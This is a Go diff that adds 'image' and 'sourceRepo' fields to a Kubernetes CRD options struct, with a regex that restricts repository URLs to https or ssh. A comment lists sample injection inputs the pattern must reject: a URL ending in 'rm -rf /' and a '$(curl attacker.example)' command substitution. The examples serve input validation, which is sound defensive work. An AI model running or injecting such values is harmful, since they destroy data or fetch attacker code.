@@ -205,6 +205,26 @@ type CategoryOptions struct {
 	// +optional
 	EnableMNNVL *bool `json:"enableMNNVL,omitempty"`
 
+	// image overrides the workload container image for catalog workloads.
+	// It replaces the trainer image in the rendered job template, the image
+	// of the primary workload container of every replicated job in the
+	// resolved TrainingRuntime dependencies, and the image of every init
+	// container in those pods whose image exactly equals the primary's
+	// pre-override image (the workload-derived inits such as
+	// fix-ssh-permissions and megatron-clone); init containers with a
+	// distinct image (such as GCP's tcpxo-daemon) and any additional
+	// containers keep their catalog images. Applied after catalog and
+	// platform overrides resolve, so it also replaces an image a platform
+	// override selects. Beware: on AWS EFA platforms (H100, GB200) the
+	// platform overrides land the workers on an nccl-tests image that ships
+	// the aws-ofi-nccl (EFA) plugin; setting image replaces that image, and
+	// the operator then owns the EFA OFI plugin being present in the
+	// replacement.
+	// +optional
+	// +kubebuilder:validation:MinLength=1
+	// +kubebuilder:validation:MaxLength=512
+	Image string `json:"image,omitempty"`
+
 	// imagePullSecrets is an optional list of references to secrets for pulling
 	// container images used by catalog workloads. If not specified, the cluster's
 	// default image pull configuration (e.g., ServiceAccount) is used.
@@ -325,6 +345,31 @@ type CategoryOptions struct {
 	// +optional
 	// +kubebuilder:validation:Pattern=`^([0-9]+(h|m|s|ms))+$`
 	MeasurementTimeout string `json:"measurementTimeout,omitempty"`
+
+	// CRD admission is the sole validation gate for sourceRepo: the rendered
+	// value is spliced into a shell command in the catalog entry's clone step
+	// and the cloned source is executed by the workload, so the Pattern below
+	// must keep rejecting inputs like
+	// "https://host/repo.git;rm -rf /" (shell metacharacters),
+	// "$(curl attacker.example)" (command substitution), and
+	// "git://host/repo.git" or "http://host/repo.git" (unauthenticated
+	// transports an on-path attacker can substitute code over, CWE-494).
+
+	// sourceRepo is the Git repository for the source checkout this category
+	// clones at pod start. Each catalog entry defines what its source is and
+	// its default upstream; point this at an internal mirror for air-gapped
+	// or restricted-egress clusters. Entries that clone no source ignore it.
+	// The URL must use an authenticated remote scheme (https:// or ssh://).
+	// http:// and git:// are intentionally rejected: the cloned source is
+	// executed by the workload, and those transports are unauthenticated.
+	// scp-style git@host:path syntax and file:// are intentionally rejected:
+	// the contract is a remote git mirror. Non-TLS mirrors and local source
+	// belong on the pre-seeded checkpoint PVC path or in the workload image
+	// instead.
+	// +optional
+	// +kubebuilder:validation:MaxLength=2048
+	// +kubebuilder:validation:Pattern=`^(https|ssh)://[A-Za-z0-9._~:/@%+-]+$`
+	SourceRepo string `json:"sourceRepo,omitempty"`
 }
 
 type CertificateCategory struct {
